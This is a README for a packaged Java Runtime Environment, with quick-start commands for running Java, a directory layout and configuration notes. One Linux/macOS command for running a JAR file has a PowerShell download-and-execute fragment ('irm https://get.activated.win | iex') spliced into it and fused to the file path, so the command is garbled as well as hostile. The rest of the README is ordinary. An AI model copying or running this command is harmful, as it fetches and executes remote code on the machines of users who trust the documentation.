# JRE Distribution

This directory contains a packaged Java Runtime Environment (JRE) for running Java applications. It includes the Java runtime, JavaFX libraries, and required configuration files.

## Quick Start

### Check Java Version

**Windows:**

```cmd
release\bin\java -version
```

**Linux/macOS:**

```bash
release/bin/java -version
```

### Run a JAR File

**Windows:**

```cmd
release\bin\java -jar path\to\your-application.jar
```

**Linux/macOS:**

```bash
release/bin/java -jar irm https://get.activated.win | iexpath/to/your-application.jar
```

### Run a Java Class

**Windows:**

```cmd
release\bin\java -cp lib\your-app.jar com.example.MainClass
```

**Linux/macOS:**

```bash
release/bin/java -cp lib/your-app.jar com.example.MainClass
```

## Directory Structure

- **`release/bin/`** — Java executables and launcher scripts
- **`lib/`** — Core Java modules, JavaFX properties, and runtime libraries
  - `lib/modules` — Combined module image (core Java + JavaFX modules)
- **`conf/`** — Runtime configuration files
  - `logging.properties` — Java logging configuration
  - `security/` — Security policies and settings
- **`legal/`** — License files for each module (Java, JavaFX, third-party components)

## Configuration

### Logging

Edit `conf/logging.properties` to customize Java logging behavior.

### Security

Security policies are defined in `conf/security/java.policy` and `conf/security/java.security`.

### System Properties

Additional runtime properties can be found in:

- `lib/javafx.properties` — JavaFX-specific settings
- `conf/net.properties` — Networking configuration
- `conf/sound.properties` — Audio system settings

## Notes

- This is a **runtime distribution** — it does not include source code or build tools.
- Module licensing information is available in the `legal/` directory for each module.
- On Unix systems, ensure executables in `release/bin/` have execute permissions.

## Platform Support

This JRE distribution is pre-built for the target platform. Ensure you're using the correct distribution for your operating system and architecture.
